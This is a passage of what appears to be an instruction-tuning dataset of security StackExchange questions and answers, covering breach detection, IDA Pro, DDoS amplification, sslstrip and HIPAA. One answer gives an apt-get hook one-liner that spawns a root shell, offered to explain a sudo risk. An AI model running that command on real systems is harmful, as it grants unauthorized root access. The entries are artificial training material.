      "question": "Knowing when there has been a data breach from your database\nHow do companies know when there has been a data breach?\nFor example, do they monitor event logs for login audits or do they wait until a paste is made of their data in a pastebin type site?\nIs it possible that many smaller companies never know that their data has been stolen?",
      "answer": "One thing not mentioned yet: fake data that is otherwise never used. If you ever encounter that information, your data leaked.\nIn how far this is practically useful depends on the data. A login attempt for a specific user name is a good example, because that kind of leaked data is likely to surface."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhy Adobe is recommending McAfee security scan during flash player installation?\nWhy is Adobe recommending a McAfee security scan during the installation of flash player?",
    "context": "",
    "output": "A: It's an affiliate thing. Adobe get paid to promote McAfee's anti-malware software. You have nothing to worry about in terms of security, it's just a marketing trick to get you to buy an AV.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why Adobe is recommending McAfee security scan during flash player installation?\nWhy is Adobe recommending a McAfee security scan during the installation of flash player?",
      "answer": "It's an affiliate thing. Adobe get paid to promote McAfee's anti-malware software. You have nothing to worry about in terms of security, it's just a marketing trick to get you to buy an AV."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow do I resolve IDA pro Hexrays aliased local variables?\nIt appears to me that in my function the compiler has reused a stack slot for two variables of types. However, Hex-Rays has not recognized it as such. How can I split the local variable into two?",
    "context": "",
    "output": "I usually add structs with unions to make the output slightly more readable when the compiler has reused a stack slot for different variables.\nIn 7.2, it seems that you can force the decompiler to \"create a new variable\", which makes this easier and less ugly. Yay!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do I resolve IDA pro Hexrays aliased local variables?\nIt appears to me that in my function the compiler has reused a stack slot for two variables of types. However, Hex-Rays has not recognized it as such. How can I split the local variable into two?",
      "answer": "I usually add structs with unions to make the output slightly more readable when the compiler has reused a stack slot for different variables.\nIn 7.2, it seems that you can force the decompiler to \"create a new variable\", which makes this easier and less ugly. Yay!"
    }
  },
  {
    "instruction": "Q: With what permissions does the Android lock screen operate?\nHow does Android handle applications like MP3 player apps that run when the screen is locked (i.e. the user has to input their pin)? \nObviously Android doesn't just let applications like music players run as root, as I have faith that the Android community understands the principle of least privilege. So how is this behavior implemented?\nEDIT:\nI apologize as my original question was too broad. Perhaps the better question here is \"With what permissions does the Android lock screen operate?\"",
    "context": "",
    "output": " A: Android has an API for music players. Those buttons you see? They're universal, and when they are pressed, they tell the app currently playing music to change/stop/pause/play the track, but Android displays them on the lock screen, not the apps themselves. \nYour analogy is incorrect. Sticky keys is an application, these buttons are not separate from the operating system. Also, Windows and Android are two very different things.\nAlso, widgets exist for android lockscreens on many devices, and these do not require root...",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "With what permissions does the Android lock screen operate?\nHow does Android handle applications like MP3 player apps that run when the screen is locked (i.e. the user has to input their pin)? \nObviously Android doesn't just let applications like music players run as root, as I have faith that the Android community understands the principle of least privilege. So how is this behavior implemented?\nEDIT:\nI apologize as my original question was too broad. Perhaps the better question here is \"With what permissions does the Android lock screen operate?\"",
      "answer": "Android has an API for music players. Those buttons you see? They're universal, and when they are pressed, they tell the app currently playing music to change/stop/pause/play the track, but Android displays them on the lock screen, not the apps themselves. \nYour analogy is incorrect. Sticky keys is an application, these buttons are not separate from the operating system. Also, Windows and Android are two very different things.\nAlso, widgets exist for android lockscreens on many devices, and these do not require root..."
    }
  },
  {
    "instruction": "Question: Chrome: Found a crash, is it a security vulnerability?\nI have been able to make Google Chrome crash, and I was wondering if there are tools or heuristics to determine whether or not the crash is a security vulnerability.\nHow can I determine if a Chrome crash is also a security vulnerability?",
    "context": "",
    "output": "Answer: I suggest reading Best way to triage crashes found via fuzzing, on Linux?, which describes exactly how to do a first-pass triage at assessing the likelihood that the crash is also a security problem.  Tools like !exploitable and Valgrind memcheck are your friend.\nIf it passes the first-level check, the next step is probably to report it to the Chrome folks and let them evaluate it in greater detail.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Chrome: Found a crash, is it a security vulnerability?\nI have been able to make Google Chrome crash, and I was wondering if there are tools or heuristics to determine whether or not the crash is a security vulnerability.\nHow can I determine if a Chrome crash is also a security vulnerability?",
      "answer": "I suggest reading Best way to triage crashes found via fuzzing, on Linux?, which describes exactly how to do a first-pass triage at assessing the likelihood that the crash is also a security problem.  Tools like !exploitable and Valgrind memcheck are your friend.\nIf it passes the first-level check, the next step is probably to report it to the Chrome folks and let them evaluate it in greater detail."
    }
  },
  {
    "instruction": "Question: Extract expiration date from private key file (.p12) without the password\nIs it possible to extract the expiration date from a private key (.p12 file) without knowing the password?\nI used the command bellow without success:\nopenssl pkcs12 -in test.p12 -nokeys -nomacver",
    "context": "",
    "output": "Answer: From my understanding, .p12 is a very flexible file format in that a p12 created by openssl can look very different from a p12 created by java keytool, but most often the contents look like this:\n\nYou need to extract the certificate, not the private key. Keys themselves don't have expiration dates, you want to extract the certificate from the p12 and look at the notAfter or validTo field.\nMy understanding is that if you created the p12 with a password, then the entire contents are encrypted as one blob. ie there is no way to access the only the certificates without knowing the password.\nI'm not an openssl expert, but this seems consistent with this openssl command-line guide, which acts on the p12 certificate and private key together:\n# Check a PKCS#12 file (.pfx or .p12)\nopenssl pkcs12 -info -in keyStore.p12\n\n# Convert a PKCS#12 file (.pfx .p12) containing a private key and certificates to PEM\nopenssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Extract expiration date from private key file (.p12) without the password\nIs it possible to extract the expiration date from a private key (.p12 file) without knowing the password?\nI used the command bellow without success:\nopenssl pkcs12 -in test.p12 -nokeys -nomacver",
      "answer": "From my understanding, .p12 is a very flexible file format in that a p12 created by openssl can look very different from a p12 created by java keytool, but most often the contents look like this:\n\nYou need to extract the certificate, not the private key. Keys themselves don't have expiration dates, you want to extract the certificate from the p12 and look at the notAfter or validTo field.\nMy understanding is that if you created the p12 with a password, then the entire contents are encrypted as one blob. ie there is no way to access the only the certificates without knowing the password.\nI'm not an openssl expert, but this seems consistent with this openssl command-line guide, which acts on the p12 certificate and private key together:\n# Check a PKCS#12 file (.pfx or .p12)\nopenssl pkcs12 -info -in keyStore.p12\n\n# Convert a PKCS#12 file (.pfx .p12) containing a private key and certificates to PEM\nopenssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes"
    }
  },
  {
    "instruction": "Downsides of showing email address on Android lock screen\nMy stock Android 9.0 gives me the option of showing some short text message on the lock screen. I want to add my email address here, so people know how to contact me if they find my phone.\nAre there any downsides to this? The address is linked to the Google account that's used on this phone.\nI know there are other options for getting my phone back, like find my phone, but I want a method that allows the finder to find me instead of the other way around.",
    "context": "",
    "output": "Your email address is generally public knowledge, so disclosing it is often not a big security risk.\nBut it gets complicated when it's your phone. Because your email address is often used as your username to log into services, and you (should) use your phone as a second factor when logging in, tying those two pieces of data might have unintended consequences. Yes, you (should have already) encrypt your phone and you (should) have a strong password to log into your phone, but there are risks depending on how you implemented everything.\nThe better option to do what you want is to display a secondary address that you do not use as a username anywhere. This is easy to do and to simply forward all emails from there to your primary address.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Downsides of showing email address on Android lock screen\nMy stock Android 9.0 gives me the option of showing some short text message on the lock screen. I want to add my email address here, so people know how to contact me if they find my phone.\nAre there any downsides to this? The address is linked to the Google account that's used on this phone.\nI know there are other options for getting my phone back, like find my phone, but I want a method that allows the finder to find me instead of the other way around.",
      "answer": "Your email address is generally public knowledge, so disclosing it is often not a big security risk.\nBut it gets complicated when it's your phone. Because your email address is often used as your username to log into services, and you (should) use your phone as a second factor when logging in, tying those two pieces of data might have unintended consequences. Yes, you (should have already) encrypt your phone and you (should) have a strong password to log into your phone, but there are risks depending on how you implemented everything.\nThe better option to do what you want is to display a secondary address that you do not use as a username anywhere. This is easy to do and to simply forward all emails from there to your primary address."
    }
  },
  {
    "instruction": "Answer the following question:\n\nBecoming HIPAA Compliant\nWhat is required to become HIPAA Compliant?\nDo I need to take a test or do I just need to follow a certain set of guidelines?\nEDIT: Just to provide my background. I am a small IT Firm and we would like to expand into the medical field and work with all the smaller medical places.",
    "context": "",
    "output": "HIPPA isn't a certification, it is a set of regulations for proper handling of personal health information.  The requirements vary based on what your role is and what data you handle.  I would recommend visiting the Health Information Privacy section of the Health & Human Services site for more info.\nIt also might not hurt to hire someone to evaluate your compliance if you are still confused about it as it is a legal requirement for handling certain types of health information.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Becoming HIPAA Compliant\nWhat is required to become HIPAA Compliant?\nDo I need to take a test or do I just need to follow a certain set of guidelines?\nEDIT: Just to provide my background. I am a small IT Firm and we would like to expand into the medical field and work with all the smaller medical places.",
      "answer": "HIPPA isn't a certification, it is a set of regulations for proper handling of personal health information.  The requirements vary based on what your role is and what data you handle.  I would recommend visiting the Health Information Privacy section of the Health & Human Services site for more info.\nIt also might not hurt to hire someone to evaluate your compliance if you are still confused about it as it is a legal requirement for handling certain types of health information."
    }
  },
  {
    "instruction": "What is the answer to this question - IDA Pro List of Functions with Instruction\nI have a DLL with a large number of functions in IDA Pro. I would like to make a script that can scan the instructions within each of the functions looking for a specific instruction. For my specific case right now, I am looking for functions that shift left (shl). I am not sure which register is being shifted so I would like to keep it versatile. I do know that it is only shifting one place in this specific case.\nI know python on a very basic level, and I know IDA-Python on a non-existent level. Please help me with suggestions on how to access this data inside IDA.\nEdit:\nI have read through this question and it says that there is no direct access to the list of functions that have been discovered by IDA.  You have to specify a starting function address.  Is there any better way to list functions?\n\n",
    "context": "",
    "output": "While in the Text View of the disassembly window, press Alt + T. In the Text Search window, search for shl and check Find all occurrences:\n\nPress OK and you will get a list of all functions that contain shl:",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "IDA Pro List of Functions with Instruction\nI have a DLL with a large number of functions in IDA Pro. I would like to make a script that can scan the instructions within each of the functions looking for a specific instruction. For my specific case right now, I am looking for functions that shift left (shl). I am not sure which register is being shifted so I would like to keep it versatile. I do know that it is only shifting one place in this specific case.\nI know python on a very basic level, and I know IDA-Python on a non-existent level. Please help me with suggestions on how to access this data inside IDA.\nEdit:\nI have read through this question and it says that there is no direct access to the list of functions that have been discovered by IDA.  You have to specify a starting function address.  Is there any better way to list functions?",
      "answer": "While in the Text View of the disassembly window, press Alt + T. In the Text Search window, search for shl and check Find all occurrences:\n\nPress OK and you will get a list of all functions that contain shl:"
    }
  },
  {
    "instruction": "Q: Difference between Amplification and Reflection Attack?\nReflection Attack: Reflection attacks are attacks that use the same protocol in both directions. The attacker spoofs the victim\u2019s IP address and sends a request for information via UDP to servers known to respond to that type of request. The server answers the request and sends the response to the victim\u2019s IP address.\nAmplification Attack: Amplification attacks generate a high volume of packets to flood the target website without alerting the intermediary, by returning a large reply to a small request.\n\nI got that Reflection attack Generate request to some servers and reflect those reply to the victims IP. But what I don't understand is, from the definition of Amplification attack it seems almost like Reflection attack. \nSo my question is, what's the core difference between Amplification and Reflection attack?\nFor your information, it is not similar as dns reflection attack vs DNS amplification attack because I am asking in terms of DOS not specifically DNS which makes it much broader than that question.",
    "context": "",
    "output": " A: TL;DR: amplification attack is a reflection attack where the reply is larger than the the request.\n\nReflection attack is if the reply is send back to the claimed origin of the request. With a spoofed source IP the attacker can make the reflecting server send the reply to the selected victim.\nAmplification is if the reply is larger then the request. An amplification attack is a kind of reflection attack, where the attacker sends a small request with a spoofed source IP address and then this results in a big (i.e. amplified) reply to the claimed source of the request, i.e. the victim. By using this amplification an attacker can use few resources to attack a large target - the higher the amplification factor is the less resources are needed by the attacker.\nA currently widely discussed amplification attack is using an insecure setup of memcached and due to the protocol spoken by memcached in can result in an amplification factor of about 50.000. See Memcrashed - Major amplification attacks from UDP port 11211 for more details. Other protocols used in the past for amplification attacks were for example NTP or DNS.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Difference between Amplification and Reflection Attack?\nReflection Attack: Reflection attacks are attacks that use the same protocol in both directions. The attacker spoofs the victim\u2019s IP address and sends a request for information via UDP to servers known to respond to that type of request. The server answers the request and sends the response to the victim\u2019s IP address.\nAmplification Attack: Amplification attacks generate a high volume of packets to flood the target website without alerting the intermediary, by returning a large reply to a small request.\n\nI got that Reflection attack Generate request to some servers and reflect those reply to the victims IP. But what I don't understand is, from the definition of Amplification attack it seems almost like Reflection attack. \nSo my question is, what's the core difference between Amplification and Reflection attack?\nFor your information, it is not similar as dns reflection attack vs DNS amplification attack because I am asking in terms of DOS not specifically DNS which makes it much broader than that question.",
      "answer": "TL;DR: amplification attack is a reflection attack where the reply is larger than the the request.\n\nReflection attack is if the reply is send back to the claimed origin of the request. With a spoofed source IP the attacker can make the reflecting server send the reply to the selected victim.\nAmplification is if the reply is larger then the request. An amplification attack is a kind of reflection attack, where the attacker sends a small request with a spoofed source IP address and then this results in a big (i.e. amplified) reply to the claimed source of the request, i.e. the victim. By using this amplification an attacker can use few resources to attack a large target - the higher the amplification factor is the less resources are needed by the attacker.\nA currently widely discussed amplification attack is using an insecure setup of memcached and due to the protocol spoken by memcached in can result in an amplification factor of about 50.000. See Memcrashed - Major amplification attacks from UDP port 11211 for more details. Other protocols used in the past for amplification attacks were for example NTP or DNS."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow to know if a file is decrypted or not\nFor school, I have to do an exercise in which I have to decrypt files by brute force attack.\nThere are a lot of different files in different file formats. The files have been encrypted using XOR or the caesar algorithm.\nI know how to try every possible key to decrypt the files but, how can I know if the file is being decrypted with the right key or not?",
    "context": "",
    "output": "If you have some idea what the cleartext is, you can use that knowledge guess when you've might have cracked the ciphertext.\nIf you think that the cleartext is english, for instance, start looking for english words in your decrypt attempt.\nIf you think the cleartext is a zip file, zip files have a signature at the beginning of the file.  Look for that signature.\nIf you think the cleartext is an email, look for telltale email headers.\nIn general, you could try to look for the \"information content\" of the decrypt attempt.  Plaintext normally has a lower information content than ciphertext, though this isn't true for a simple caesar cipher.\nBut you need to start with some inking of what the cleartext might contain, even if (as above) it's merely \"a lower information content score than the ciphertext\".",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to know if a file is decrypted or not\nFor school, I have to do an exercise in which I have to decrypt files by brute force attack.\nThere are a lot of different files in different file formats. The files have been encrypted using XOR or the caesar algorithm.\nI know how to try every possible key to decrypt the files but, how can I know if the file is being decrypted with the right key or not?",
      "answer": "If you have some idea what the cleartext is, you can use that knowledge guess when you've might have cracked the ciphertext.\nIf you think that the cleartext is english, for instance, start looking for english words in your decrypt attempt.\nIf you think the cleartext is a zip file, zip files have a signature at the beginning of the file.  Look for that signature.\nIf you think the cleartext is an email, look for telltale email headers.\nIn general, you could try to look for the \"information content\" of the decrypt attempt.  Plaintext normally has a lower information content than ciphertext, though this isn't true for a simple caesar cipher.\nBut you need to start with some inking of what the cleartext might contain, even if (as above) it's merely \"a lower information content score than the ciphertext\"."
    }
  },
  {
    "instruction": "Can you tell me the answer to: benefits of xinetd for a web server\nWhat are the pros and cons of using xinetd for a web server running on a VPS. Assume the following measures have already been taken to secure the system:\n\nsystem hardening, latest updates, minimal packages\nstrick iptables firewall\ncontrolled/limited use of admin privileges\nproperly configured services\nhardened web application\nweb application firewall\ncontinuous vulnerability assessments\nlog monitoring",
    "context": "",
    "output": "answer: Putting an xinetd server in front of your web server will reduce security: in addition to any security holes in the web server, you now also are vulnerable to any security holes in xinetd.  Any security measures you can apply through xinetd, you can apply instead through the firewall or the web server.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "benefits of xinetd for a web server\nWhat are the pros and cons of using xinetd for a web server running on a VPS. Assume the following measures have already been taken to secure the system:\n\nsystem hardening, latest updates, minimal packages\nstrick iptables firewall\ncontrolled/limited use of admin privileges\nproperly configured services\nhardened web application\nweb application firewall\ncontinuous vulnerability assessments\nlog monitoring",
      "answer": "Putting an xinetd server in front of your web server will reduce security: in addition to any security holes in the web server, you now also are vulnerable to any security holes in xinetd.  Any security measures you can apply through xinetd, you can apply instead through the firewall or the web server."
    }
  },
  {
    "instruction": "Answer this question:\n\nExploiting free WIFI security\nSo I was watching some Backtrack learning videos and similar stuff, and noticed how there is always talk about getting people's information. For example if someone using unsecured WIFI you can see what pages he is browsing of even steal his Facebook session.\nSo as far as I understand, hacker cannot get any real value from seeing that information. Even if they steal my Facebook session and post some nonsense, they gained nothing out of it material wise, right? I mean they cannot steal my Paypal credentials because they are encrypted, all they can do is access stuff which is not that important to me in the first place.\nAre there any real life examples, where hacker can get some real benefit apart from getting password to random forum or just causing harm to other person?",
    "context": "",
    "output": "A: I mean they cannot steal my Paypal credentials because they are\n  encrypted, all they can do is access stuff which is not that important\n  to me in the first place.\n\nThis is a huge assumption. \nAn attacker could use something like sslstrip to change all references of HTTPS to HTTP. It is quite common for websites to serve content via HTTP and use an HTTPS login. The attacker would force you to use plaintext, while then retransmitting the data to the target site with SSL.\nThe attacker could also present your browser with a fake certificate when trying to access a secure site. While this would normally trigger a warning in your browser, it poses a security risk to most users. Companies often implement self signed certs poorly, and train their staff to acknowledge the warnings. This creates complacency that can leak into their personal life, as they are conditioned to see these warnings as nothing but a step in getting to their final destination.\nSo while a power user may not fall for some of the tricks posed, its quite possible that the average user could have important credentials stolen with these attacks pretty easily.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Exploiting free WIFI security\nSo I was watching some Backtrack learning videos and similar stuff, and noticed how there is always talk about getting people's information. For example if someone using unsecured WIFI you can see what pages he is browsing of even steal his Facebook session.\nSo as far as I understand, hacker cannot get any real value from seeing that information. Even if they steal my Facebook session and post some nonsense, they gained nothing out of it material wise, right? I mean they cannot steal my Paypal credentials because they are encrypted, all they can do is access stuff which is not that important to me in the first place.\nAre there any real life examples, where hacker can get some real benefit apart from getting password to random forum or just causing harm to other person?",
      "answer": "I mean they cannot steal my Paypal credentials because they are\n  encrypted, all they can do is access stuff which is not that important\n  to me in the first place.\n\nThis is a huge assumption. \nAn attacker could use something like sslstrip to change all references of HTTPS to HTTP. It is quite common for websites to serve content via HTTP and use an HTTPS login. The attacker would force you to use plaintext, while then retransmitting the data to the target site with SSL.\nThe attacker could also present your browser with a fake certificate when trying to access a secure site. While this would normally trigger a warning in your browser, it poses a security risk to most users. Companies often implement self signed certs poorly, and train their staff to acknowledge the warnings. This creates complacency that can leak into their personal life, as they are conditioned to see these warnings as nothing but a step in getting to their final destination.\nSo while a power user may not fall for some of the tricks posed, its quite possible that the average user could have important credentials stolen with these attacks pretty easily."
    }
  },
  {
    "instruction": "Question: How should I securely type a password in front of a lot of people?\nI am a manager in an office where the company does not provide a company email, so I use my personal email.\nOften, I will receive jobs lists by email from my general manager.\nHow should I log in to my email in front of my co-workers so that they don't see my password?\nMy email service uses end to end encryption, which means that it does not store or reset my password.\nI also cannot move the screen so my co-workers cannot see it.",
    "context": "",
    "output": "Answer: Get a password manager like KeePass and store your password there. Use the auto-type or a plugin to enter the password.\n\nUnlock your KeePass database when you boot your machine, so that you don't have to unlock it with people around.\nSet it up so that it locks automatically when you lock the screen (just in case)\n\nAlternatively, you can remember the e-mail password in your browser, which has downsides compared to KeePass but will keep your password save (given enough scrutiny).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How should I securely type a password in front of a lot of people?\nI am a manager in an office where the company does not provide a company email, so I use my personal email.\nOften, I will receive jobs lists by email from my general manager.\nHow should I log in to my email in front of my co-workers so that they don't see my password?\nMy email service uses end to end encryption, which means that it does not store or reset my password.\nI also cannot move the screen so my co-workers cannot see it.",
      "answer": "Get a password manager like KeePass and store your password there. Use the auto-type or a plugin to enter the password.\n\nUnlock your KeePass database when you boot your machine, so that you don't have to unlock it with people around.\nSet it up so that it locks automatically when you lock the screen (just in case)\n\nAlternatively, you can remember the e-mail password in your browser, which has downsides compared to KeePass but will keep your password save (given enough scrutiny)."
    }
  },
  {
    "instruction": "Answer this question:\n\nShoutmeloud notification on Mac\nI started lately getting some ads notification on my Mac from \"ShoutMeLoud\"\nI don't know if it is related to Chrome or not.\nIs that a virus?",
    "context": "",
    "output": "A: That's web push notifications. You can disable it from your browser settings.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Shoutmeloud notification on Mac\nI started lately getting some ads notification on my Mac from \"ShoutMeLoud\"\nI don't know if it is related to Chrome or not.\nIs that a virus?",
      "answer": "That's web push notifications. You can disable it from your browser settings."
    }
  },
  {
    "instruction": "Question: What are the potential vulnerabilities of allowing non-root users to run apt-get?\nThere are two ways I can think of doing this:\n\nOn a system with sudo, by modifying /etc/sudoers.\nOn a system without sudo (such as a Docker environment), by writing a program similar to the below and setting the setuid bit with chmod u+s. apt-get checks real uid, so a setuid call is necessary.\n\n...\nint main(int argc, char **argv) {\n    char *envp[] = { ... };\n    setuid(0);\n    execve(\"/usr/bin/apt-get\", argv, envp);\n    return 1;\n}\n\nI have two questions:\n\nWhat are the potential vulnerabilities of allowing non-root users to run apt-get?\nMy goal is to allow people to install/remove/update packages, given that apt-get lives in a custom non-system refroot and installs from a custom curated apt repository. Are there safer ways to allow non-root users to run apt-get on a system without sudo?",
    "context": "",
    "output": "Answer: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n\nFrom GTFOBins\nThis gives you a root shell on the system. No creating packages and adding fake repos; this will give the user who runs this command easy and simple access to root.\nSo, in answer to your question, you are effectively giving root to every user who has access to this binary. If you are willing to do this, then you might as well just give them sudo access or the root password.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the potential vulnerabilities of allowing non-root users to run apt-get?\nThere are two ways I can think of doing this:\n\nOn a system with sudo, by modifying /etc/sudoers.\nOn a system without sudo (such as a Docker environment), by writing a program similar to the below and setting the setuid bit with chmod u+s. apt-get checks real uid, so a setuid call is necessary.\n\n...\nint main(int argc, char **argv) {\n    char *envp[] = { ... };\n    setuid(0);\n    execve(\"/usr/bin/apt-get\", argv, envp);\n    return 1;\n}\n\nI have two questions:\n\nWhat are the potential vulnerabilities of allowing non-root users to run apt-get?\nMy goal is to allow people to install/remove/update packages, given that apt-get lives in a custom non-system refroot and installs from a custom curated apt repository. Are there safer ways to allow non-root users to run apt-get on a system without sudo?",
      "answer": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh\n\nFrom GTFOBins\nThis gives you a root shell on the system. No creating packages and adding fake repos; this will give the user who runs this command easy and simple access to root.\nSo, in answer to your question, you are effectively giving root to every user who has access to this binary. If you are willing to do this, then you might as well just give them sudo access or the root password."
    }
  },
  {
    "instruction": "What is the answer to this question - How to safely execute batch file viruses for practice?\nI'm following a tutorial on fork bomb and thought it was pretty interesting. TL;DR: It's basically just a program that replicates itself until the computer freezes/crashes.\nI want to see how it actually looks like when executing but don't want to screw up my computer. What's a safe way to try out batch file viruses?\n\n",
    "context": "",
    "output": "You can run it in a virtual machine. A virtual machine emulates a computer on your computer. You can give it a limited amount of resources (CPU's, memory) and the environment on the virtual machine can not access the computer it runs on. Popular software to run virtual machines are VirtualBox and VMWare.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to safely execute batch file viruses for practice?\nI'm following a tutorial on fork bomb and thought it was pretty interesting. TL;DR: It's basically just a program that replicates itself until the computer freezes/crashes.\nI want to see how it actually looks like when executing but don't want to screw up my computer. What's a safe way to try out batch file viruses?",
      "answer": "You can run it in a virtual machine. A virtual machine emulates a computer on your computer. You can give it a limited amount of resources (CPU's, memory) and the environment on the virtual machine can not access the computer it runs on. Popular software to run virtual machines are VirtualBox and VMWare."
    }
  },
  {
    "instruction": "What is the answer to this question - How to get API name from address in registry value in IDA plugin\nFor example I have eax 7c9100a4 -> ntdll.RtlCreateHeap\nI can get reg value in my plugin but I can't get the api name\nHow can get the correct api name from the address?\n\n",
    "context": "",
    "output": "NameEx(BADADDR, GetRegValue(\"EAX\"))",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to get API name from address in registry value in IDA plugin\nFor example I have eax 7c9100a4 -> ntdll.RtlCreateHeap\nI can get reg value in my plugin but I can't get the api name\nHow can get the correct api name from the address?",
      "answer": "NameEx(BADADDR, GetRegValue(\"EAX\"))"
    }
  },
  {
    "instruction": "What is the answer to this question - Why does OWASP recommend security questions?\nI was reading the OWASP Forgot Password Cheat Sheet when I stumbled upon the recommendation to use security questions. \nThere is even a dedicated page about what information to gather.\nWhenever I see such a \"feature\" on a web site it strikes me as unbelievably insecure for most users, because most users will choose a question an answer that is probably very easy to find out by anyone who knows the person a bit. So I was very surprised to see such a recommendation on OWASP.\nIs it really a good idea to implement security questions?\n\n",
    "context": "",
    "output": "Specifically with regards to security questions you are asking users to share potentially sensitive facts about themselves that are likely obtainable by social engineering of people near them.  That makes security questions at best inadvisable and at worst downright dangerous from a holisic security perspective.\nOWASP, while good overall for explaining the problems, makes many inadvisable recommendations including security questions, input whitelisting, and XXE mitigations that prevent loading most XML documents.  Take the problem descriptions as they are, but really scrutinize their solutions before considering implementing them.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why does OWASP recommend security questions?\nI was reading the OWASP Forgot Password Cheat Sheet when I stumbled upon the recommendation to use security questions. \nThere is even a dedicated page about what information to gather.\nWhenever I see such a \"feature\" on a web site it strikes me as unbelievably insecure for most users, because most users will choose a question an answer that is probably very easy to find out by anyone who knows the person a bit. So I was very surprised to see such a recommendation on OWASP.\nIs it really a good idea to implement security questions?",
      "answer": "Specifically with regards to security questions you are asking users to share potentially sensitive facts about themselves that are likely obtainable by social engineering of people near them.  That makes security questions at best inadvisable and at worst downright dangerous from a holisic security perspective.\nOWASP, while good overall for explaining the problems, makes many inadvisable recommendations including security questions, input whitelisting, and XXE mitigations that prevent loading most XML documents.  Take the problem descriptions as they are, but really scrutinize their solutions before considering implementing them."
    }
  },
  {
    "instruction": "Use RSA Encryption With ASP.NET\nMy goal is to implement asymmetric encryption in an ASP.NET website to secure user-entered Social Security Numbers. I want to encrypt the SSNs with a public key, and only display a masked version, to the user (ie XXX-XX-1234). (A separate application running apart from the website will have access to the private key and decrypt the SSNs to transfer them to another system.)\nI'm trying to use the built-in RSACryptoServiceProvider but I keep getting an error:\nThe system cannot find the file specified.\n\nIt runs to just fine on my own machine, because I'm an admin on my machine. But on the server (Windows 2008 R2 Standard), it errors out. The website is running as IIS APPPOOL\\MyWebSiteName.\nI saw on a tutorial that I would need to give IIS NTFS permission for C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Crypto\\RSA. The reason is that supposedly the RSA API writes temp files to that folder, even if you give it the keys in memory. But I've tried different combinations of users and permissions and nothing's worked.\nI realize I could put the public/private key pair in a key container and use aspnet_regiis.exe to grant IIS access to the key, but that defeats the purpose of keeping the private key separate from the website. I'm also concerned that giving IIS access to this folder would also compromise the other system key containers stored there.\nHow do I get ASP.NET to work with RSACryptoServiceProvider? Or should I just use some other method to do RSA encryption?",
    "context": "",
    "output": "I personally use Cryptosys PKI to do all of my RSA cryptography within my .net apps. I find it so much simpler than the built in methods - and for the main reason that it allows testing with my previous company's well established weak test keys.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Use RSA Encryption With ASP.NET\nMy goal is to implement asymmetric encryption in an ASP.NET website to secure user-entered Social Security Numbers. I want to encrypt the SSNs with a public key, and only display a masked version, to the user (ie XXX-XX-1234). (A separate application running apart from the website will have access to the private key and decrypt the SSNs to transfer them to another system.)\nI'm trying to use the built-in RSACryptoServiceProvider but I keep getting an error:\nThe system cannot find the file specified.\n\nIt runs to just fine on my own machine, because I'm an admin on my machine. But on the server (Windows 2008 R2 Standard), it errors out. The website is running as IIS APPPOOL\\MyWebSiteName.\nI saw on a tutorial that I would need to give IIS NTFS permission for C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Crypto\\RSA. The reason is that supposedly the RSA API writes temp files to that folder, even if you give it the keys in memory. But I've tried different combinations of users and permissions and nothing's worked.\nI realize I could put the public/private key pair in a key container and use aspnet_regiis.exe to grant IIS access to the key, but that defeats the purpose of keeping the private key separate from the website. I'm also concerned that giving IIS access to this folder would also compromise the other system key containers stored there.\nHow do I get ASP.NET to work with RSACryptoServiceProvider? Or should I just use some other method to do RSA encryption?",
      "answer": "I personally use Cryptosys PKI to do all of my RSA cryptography within my .net apps. I find it so much simpler than the built in methods - and for the main reason that it allows testing with my previous company's well established weak test keys."
    }
  },
  {
    "instruction": "What is the answer to this question - How do I view a kernel routine in Windows\nI've been reading a book about reverse engineering assembly code, and although it is very informative, It has questions such as decompile KeReadyThread- Im pretty good at assembly, and want to give it a shot, but how exactly do i view the assembly code of this kernel or any others? thanks\n\n",
    "context": "",
